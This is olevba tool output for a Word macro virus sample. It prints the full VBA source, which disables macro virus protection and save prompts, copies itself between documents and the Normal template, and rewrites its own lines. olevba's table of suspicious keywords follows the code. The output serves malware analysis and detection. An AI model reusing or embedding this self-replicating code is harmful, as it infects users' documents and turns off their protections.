olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-9a1ec4037285472bb18718446afff9c6438c9c18
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-9a1ec4037285472bb18718446afff9c6438c9c18 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'vir.docvir.doc
On Error Resume Next
'vir.docvir.doc
Options.SaveNormalPrompt = 0
'vir.docvir.doc
Options.ConfirmConversions = 0
'vir.docvir.doc
FA65 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'vir.docvir.doc
Options.VirusProtection = 0
'vir.docvir.doc
DT71 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'vir.docvir.doc
Application.EnableCancelKey = 0
'vir.docvir.doc
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'vir.docvir.doc
Set IS41 = ActiveDocument.VBProject.VBComponents.Item(1)
'vir.docvir.doc
SQ26 = True
'vir.docvir.doc
End If
'vir.docvir.doc
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
'vir.docvir.doc
Set IS41 = NormalTemplate.VBProject.VBComponents.Item(1)
'vir.docvir.doc
TR25 = True
'vir.docvir.doc
End If
'vir.docvir.doc
If TR25 <> True And SQ26 <> True Then GoTo NE9
'vir.docvir.doc
If TR25 = True Then IS41.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, FA65 - 1))
'vir.docvir.doc
If SQ26 = True Then IS41.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, DT71 - 1))
'vir.docvir.doc
With IS41.CodeModule
'vir.docvir.doc
For x = 2 To (IS41.CodeModule.CountOfLines - 1) Step 2
'vir.docvir.doc
.replaceline x, "'" & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter
'vir.docvir.doc
Next x
'vir.docvir.doc
End With
'vir.docvir.doc
NE9:
'vir.docvir.doc
If DT71 <> 0 And FA65 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'vir.docvir.doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

